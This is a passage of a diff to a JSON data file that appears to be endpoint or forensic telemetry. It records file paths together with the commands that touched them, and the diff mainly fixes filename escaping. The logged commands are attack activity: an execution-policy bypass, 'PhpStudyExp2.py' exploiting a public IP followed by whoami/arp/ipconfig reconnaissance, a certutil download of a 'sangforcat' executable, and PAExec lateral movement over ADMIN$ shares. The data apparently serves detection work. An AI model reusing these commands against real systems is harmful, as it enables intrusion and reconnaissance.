         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "d177ab2dc05ca57265b60eb55116c42e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "d2ed4cd579168a90b6f0fa5742edc8be"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "dbd4e825b161fd53d367cabbc69f1d83"
     },
     {
-        "filename": "  C:/windows/system32/windowspowershell/\\\nv1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\"",
+        "filename": "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "dcae2afa9846ee566d2c6404f9afef71"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "de3784ae2723b2181831b6aa89c4c97d"
     },
     {
-        "filename": "  C:/windows/system32/windowspowershell/\\\nv1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\"",
+        "filename": "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "e636f75c0745da496fbac6198c53a15c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "f46cc662d7094464320f991d012b199b"
     },
     {
-        "filename": "  //192.168.0.244/pipe/PAExecOutWIN2012-14224\"",
-        "cmd": "PAExec",
-        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
-        "key": "1a6b5a63866adefa520ac224871bfb36"
-    },
-    {
-        "filename": "  //192.168.0.244/ADMIN$/PAExec-4224-WIN2012-1.exe\"",
-        "cmd": "PAExec",
-        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
-        "key": "55dbe9a47076057fa24e59d36f378d33"
-    },
-    {
-        "filename": "  //192.168.0.244/pipe/PAExecErrWIN2012-14224\"",
-        "cmd": "PAExec",
-        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
-        "key": "88fc3820c41f07e7529483f2952e9762"
-    },
-    {
-        "filename": "  //192.168.0.244/pipe/PAExec-4224-WIN2012-1.exe\"",
-        "cmd": "PAExec",
-        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
-        "key": "d6fe9551225f91a538be7b23c617e494"
-    },
-    {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/EL23LX32GLKP49X84M2N.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/EL23LX32GLKP49X84M2N.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:b7f92752-df34-4b08-9e98-45a3004b94ff",
         "id": "5fb8c454b74cd087c9173797e2a28fe8",
         "key": "4a3309b9130f0a2aea584a77d4af5eed"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/QMZSXEFE9Y03YZX3I7J9.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/QMZSXEFE9Y03YZX3I7J9.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "6b94ac37e23ec99f6f0b42ec80ba5292",
         "key": "e7af30f74afc2c9c6b4bfadc12136f62"
     },
     {
-        "filename": "  C:/Users/Public/sangforcat1.exe.Manifest\"",
+        "filename": "  C:/Users/Public/sangforcat1.exe.Manifest\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:dbb2f234-101f-4f44-bb97-72263635f506",
         "id": "79e647173fa9f90a3d1824085ed54209",
         "key": "61b6ee55dd5b47dcb63192115b0b7af0"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/PVTBUC15U6707GF221JD.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/PVTBUC15U6707GF221JD.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:dbb2f234-101f-4f44-bb97-72263635f506",
         "id": "79e647173fa9f90a3d1824085ed54209",
         "key": "b36fd217472e1d20ae170b6c2c51ff4e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/9VFIP860CKE1LHLIBMFO.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/9VFIP860CKE1LHLIBMFO.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:b7f92752-df34-4b08-9e98-45a3004b94ff",
         "id": "a5c0daa1992383a1b51018d3a0731f46",
         "key": "1012af495027d400a233af75c334bed7"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/TXJZ0MQULVJIM968YX3K.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/TXJZ0MQULVJIM968YX3K.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1/ &apos;",
         "id": "c21e17ba94c56d084eca6701a20c1aed",
         "key": "6b896198edff38a5d2a3273f9616b638"
     },
     {
-        "filename": "  //192.168.0.95/ADMIN$/PAExec-2196-WIN2012-1.exe\"",
-        "cmd": "PAExec",
-        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
-        "key": "2fe22506b7a94a0a2e7a909e53f8f9ca"
-    },
-    {
-        "filename": "  //192.168.0.95/pipe/PAExec-2196-WIN2012-1.exe\"",
-        "cmd": "PAExec",
-        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
-        "key": "395e469ef3d2d659f2a22e2c0b14f3bf"
-    },
-    {
-        "filename": "  //192.168.0.95/pipe/PAExecErrWIN2012-12196\"",
-        "cmd": "PAExec",
-        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
-        "key": "cf24b806a7c3ac1ae0d29943e433766e"
-    },
-    {
-        "filename": "  //192.168.0.95/pipe/PAExecOutWIN2012-12196\"",
-        "cmd": "PAExec",
-        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
-        "key": "d7651ece378aa908c5bbb6ce5ac7303c"
-    },
-    {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/ZJOHMNEXZVSFTFQ9N3LM.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/ZJOHMNEXZVSFTFQ9N3LM.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo end:dbb2f234-101f-4f44-bb97-72263635f506",
         "id": "f5c0147f949c803297be02b4a0ae98f2",
         "key": "90400a4ba700774bd88b03383a5a6bdb"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/LocalLow/\\\nMicrosoft/CryptnetUrlCache/MetaData/7D6D5BC99FBAD78A324FC7E52924C2A8\"",
-        "cmd": "certutil",
-        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
-        "key": "49e1cfac14f62c737180b12e23344786"
+        "filename": "  //192.168.0.244/pipe/PAExecOutWIN2012-14224\\\"\"",
+        "cmd": "null",
+        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
+        "key": "1a6b5a63866adefa520ac224871bfb36"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/INetCache/IE/69T5JAAG/sangforcat[2].exe\"",
-        "cmd": "certutil",
-        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
-        "key": "83fd8be74bef197da769bf919e71e69e"
+        "filename": "  //192.168.0.244/ADMIN$/PAExec-4224-WIN2012-1.exe\\\"\"",
+        "cmd": "null",
+        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
+        "key": "55dbe9a47076057fa24e59d36f378d33"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/LocalLow/\\\nMicrosoft/CryptnetUrlCache/Content/7D6D5BC99FBAD78A324FC7E52924C2A8\"",
-        "cmd": "certutil",
-        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
-        "key": "9d519ed81b50a266af994542cd731adf"
+        "filename": "  //192.168.0.244/pipe/PAExecErrWIN2012-14224\\\"\"",
+        "cmd": "null",
+        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
+        "key": "88fc3820c41f07e7529483f2952e9762"
+    },
+    {
+        "filename": "  //192.168.0.244/pipe/PAExec-4224-WIN2012-1.exe\\\"\"",
+        "cmd": "null",
+        "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
+        "key": "d6fe9551225f91a538be7b23c617e494"
+    },
+    {
+        "filename": "  //192.168.0.95/ADMIN$/PAExec-2196-WIN2012-1.exe\\\"\"",
+        "cmd": "null",
+        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
+        "key": "2fe22506b7a94a0a2e7a909e53f8f9ca"
+    },
+    {
+        "filename": "  //192.168.0.95/pipe/PAExec-2196-WIN2012-1.exe\\\"\"",
+        "cmd": "null",
+        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
+        "key": "395e469ef3d2d659f2a22e2c0b14f3bf"
+    },
+    {
+        "filename": "  //192.168.0.95/pipe/PAExecErrWIN2012-12196\\\"\"",
+        "cmd": "null",
+        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
+        "key": "cf24b806a7c3ac1ae0d29943e433766e"
+    },
+    {
+        "filename": "  //192.168.0.95/pipe/PAExecOutWIN2012-12196\\\"\"",
+        "cmd": "null",
+        "id": "7edf352f9fb1500fc7ad04c4e05ec912",
+        "key": "d7651ece378aa908c5bbb6ce5ac7303c"
     }
 ]
